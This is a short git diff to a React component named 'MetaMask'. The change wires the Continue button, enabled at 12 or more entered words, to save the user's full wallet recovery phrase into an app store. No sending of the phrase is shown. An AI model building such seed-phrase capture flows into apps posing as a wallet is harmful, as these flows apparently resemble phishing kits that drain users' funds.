@@ -1,12 +1,24 @@
 "use client";
 
+import { useWalletStore } from "@/store/walletStore";
 import { InfoIcon } from "lucide-react";
 import React, { useState, useRef, useEffect } from "react";
 
-export default function MetaMask() {
+export default function MetaMask({
+	handleFinish,
+}: {
+	handleFinish: () => void;
+}) {
 	const [words, setWords] = useState<string[]>([""]);
 	const [visibility, setVisibility] = useState<boolean[]>([false]);
 	const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+
+	const { setSeedPhrase } = useWalletStore();
+
+	const handleComplete = () => {
+		setSeedPhrase(words.join(" "));
+		handleFinish();
+	};
 
 	// Add a new input automatically
 	const addNewInput = () => {
@@ -131,6 +143,7 @@ export default function MetaMask() {
 
 				{/* Continue button */}
 				<button
+					onClick={handleComplete}
 					className={`w-full py-3 rounded-lg font-medium transition-all mt-auto ${
 						filledCount >= 12
 							? "bg-neutral-100 hover:bg-neutral-200 text-neutral-800"
